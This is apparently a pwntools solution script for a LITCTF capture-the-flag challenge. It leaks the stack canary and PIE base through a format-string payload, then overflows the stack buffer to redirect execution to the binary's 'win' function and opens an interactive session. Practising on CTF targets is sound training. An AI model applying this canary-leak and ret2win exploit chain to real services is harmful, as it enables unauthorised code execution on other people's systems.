from pwn import *

context.binary = elf = ELF("./s", checksec=False)

io = remote("litctf.org", 31791)

io.sendline(b"%11$lx %13$lx")

canary, pie = [int(x, 16) for x in io.recv(29).split()]

elf.address = pie - (elf.sym["main"] + 58)

info("Leak pie: " + hex(elf.address))
info("Leak canary: " + hex(canary))

ret = elf.address + 0x101a
io.sendline(flat(
    b"a"*40, canary, 0, ret, elf.sym["win"]
))
io.interactive()